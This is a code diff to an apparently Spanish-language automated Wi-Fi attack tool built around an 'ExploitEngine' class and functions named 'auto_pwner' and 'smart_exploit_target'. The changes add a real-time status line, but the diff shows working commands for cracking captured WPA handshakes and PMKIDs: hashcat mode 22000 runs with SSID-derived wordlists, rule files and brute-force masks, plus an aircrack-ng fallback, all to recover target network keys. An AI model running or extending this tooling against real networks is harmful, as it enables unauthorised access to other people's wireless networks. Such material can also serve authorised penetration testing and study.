@@ -157,6 +157,7 @@ class ExploitEngine:
         self._thread  = None
         self.result   = None      # clave encontrada o None
         self.method   = None      # método que funcionó
+        self._status  = ""        # línea de estado visible en tiempo real
 
     # ── Gestión de fases ───────────────────────────────────────────────────────
     def add_phase(self, name: str, weight: int = 1):
@@ -172,6 +173,11 @@ class ExploitEngine:
         with self._lock:
             self._phase_pct = min(100, max(0, pct))
             self._recalc()
+
+    def set_status(self, msg: str):
+        """Actualiza la línea de estado visible en tiempo real en el display."""
+        with self._lock:
+            self._status = msg
 
     def _recalc(self):
         if not self._phases: return
@@ -213,8 +219,16 @@ class ExploitEngine:
                 panel = f"  {DIM}── Sin resultados aún ──{END}"
                 n_lines = 2
 
+            with self._lock:
+                status_msg = self._status
+
+            status_line = (
+                f"  {DIM}⚡ {status_msg[:72]}{END}" if status_msg else ""
+            )
+            total_lines = n_lines + (1 if status_msg else 0)
+
             if not first:
-                sys.stdout.write(f"\033[{n_lines}A")  # subir N líneas
+                sys.stdout.write(f"\033[{total_lines}A")  # subir N líneas
 
             sys.stdout.write(panel + "\n")
             sys.stdout.write(
@@ -222,11 +236,13 @@ class ExploitEngine:
                 f"[{bar}] {col}{pct:>3}%{END}  "
                 f"{DIM}{pname[:28]}… {cpct}%{END}   \n"
             )
+            if status_msg:
+                sys.stdout.write(status_line + "   \n")
             sys.stdout.flush()
             i += 1
             first = False
             time.sleep(0.12)
-        sys.stdout.write(f"\033[{n_lines}A" + ("\n" + " " * 90) * n_lines + "\r")
+        sys.stdout.write(f"\033[{total_lines}A" + ("\n" + " " * 90) * total_lines + "\r")
         sys.stdout.flush()
 
     def start(self):
@@ -241,7 +257,7 @@ class ExploitEngine:
         # Si el thread sigue vivo, limpiar pantalla a la fuerza
         if self._thread and self._thread.is_alive():
             try:
-                sys.stdout.write("\033[4A" + ("\n" + " " * 100) * 4 + "\r")
+                sys.stdout.write("\033[5A" + ("\n" + " " * 100) * 5 + "\r")
                 sys.stdout.flush()
             except Exception:
                 pass
@@ -4740,17 +4756,15 @@ def auto_pwner():
                     "/usr/share/doc/hashcat/rules/best64.rule",
                 ] if os.path.exists(p)), "")
                 rf = f"-r {best64}" if best64 else ""
-                hc_out = run(
-                    f"hashcat -m 22000 -O {hc_file} {wordlist} {rf} --force "
-                    f"--status --status-timer=5 --machine-readable 2>/dev/null",
-                    capture=True
-                ) or ""
-                pwd_m = re.search(r'Recovered.*?:.*?:([^:]+)$', hc_out, re.MULTILINE)
-                if not pwd_m:
-                    pwd_m = re.search(r'\*\*\*\s*(.+)', hc_out)
+                wl_name   = os.path.basename(wordlist)
+                rule_name = os.path.basename(best64) if best64 else "sin regla"
+                info(f"  → hashcat: {wl_name} + {rule_name} (max 300s, verás velocidad abajo)")
+                run(
+                    f"timeout 300 hashcat -m 22000 -O {hc_file} {wordlist} {rf} --force "
+                    f"--status --status-timer=5 2>/dev/null"
+                )
                 # hashcat potfile
-                potfile = run("hashcat --potfile-path ~/.hashcat/hashcat.potfile "
-                              f"--show -m 22000 {hc_file} 2>/dev/null", capture=True) or ""
+                potfile = run(f"hashcat --show --quiet -m 22000 {hc_file} 2>/dev/null", capture=True) or ""
                 pot_m = re.search(r':(.+)$', potfile, re.MULTILINE)
                 if pot_m:
                     clave = pot_m.group(1).strip()
@@ -6464,6 +6478,9 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
                 # Crackear PMKID: 1) SSID wordlist 2) wordlist principal
                 for wl in [ssid_wl, wordlist]:
                     if not wl or not os.path.exists(wl): continue
+                    wl_name = os.path.basename(wl)
+                    rule_name = os.path.basename(available_rules[0]) if available_rules else "sin regla"
+                    eng.set_status(f"hashcat PMKID · {wl_name} + {rule_name} (max 300s)…")
                     run(f"timeout 300 hashcat -m 22000 -O {pmkid_hc} {wl} {rule_arg} "
                         f"--force --quiet 2>/dev/null")
                     pot = run(f"hashcat --show --quiet -m 22000 {pmkid_hc} 2>/dev/null",
@@ -6540,6 +6557,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
         if os.path.exists(ssid_wl) and check_tool("hashcat") and \
                 os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
             eng.update_phase(20)
+            eng.set_status(f"hashcat Ronda 1 · wordlist SSID personalizada (max 60s)…")
             run(f"timeout 60 hashcat -m 22000 -O {hc_file} {ssid_wl} --force --quiet 2>/dev/null")
             pot = run(f"hashcat --show --quiet -m 22000 {hc_file} 2>/dev/null", capture=True) or ""
             pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
@@ -6554,6 +6572,9 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
             for ri, rule in enumerate(available_rules or [""]):
                 eng.update_phase(35 + ri * 15)
                 rf = f"-r {rule}" if rule else ""
+                wl_name   = os.path.basename(wordlist)
+                rule_name = os.path.basename(rule) if rule else "sin regla"
+                eng.set_status(f"hashcat Ronda 2 · {wl_name} + {rule_name} (max 300s)…")
                 run(f"timeout 300 hashcat -m 22000 -O {hc_file} {wordlist} {rf} "
                     f"--force --quiet 2>/dev/null")
                 pot = run(f"hashcat --show --quiet -m 22000 {hc_file} 2>/dev/null",
@@ -6567,6 +6588,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
         # Ronda 3: aircrack-ng fallback
         eng.update_phase(80)
         if check_tool("aircrack-ng") and os.path.exists(wordlist):
+            eng.set_status(f"aircrack-ng Ronda 3 · {os.path.basename(wordlist)}…")
             ac_out = run(
                 f"aircrack-ng {cap_file} -w {wordlist} 2>/dev/null",
                 capture=True
@@ -6602,6 +6624,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
         _hf = _hash_files[0]
         for mi, (mask_name, mask) in enumerate(_MASKS):
             eng.update_phase(int(mi / len(_MASKS) * 95))
+            eng.set_status(f"hashcat máscara [{mi+1}/{len(_MASKS)}] · {mask_name}: {mask} (max 120s)…")
             run(f"timeout 120 hashcat -m 22000 -O {_hf} -a 3 '{mask}' --force --quiet 2>/dev/null",
                 capture=True)
             pot = run(f"hashcat --show --quiet -m 22000 {_hf} 2>/dev/null", capture=True) or ""
@@ -6667,6 +6690,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
             _gen_ssid_wordlist(essid, ssid_wl2, bssid)
             for wl in [ssid_wl2, wordlist]:
                 if not wl or not os.path.exists(wl): continue
+                eng.set_status(f"hashcat PMKID retry · {os.path.basename(wl)} (max 300s)…")
                 run(f"timeout 300 hashcat -m 22000 -O {hc222} {wl} --force --quiet 2>/dev/null",
                     capture=True)
                 pot = run(f"hashcat --show --quiet -m 22000 {hc222} 2>/dev/null",
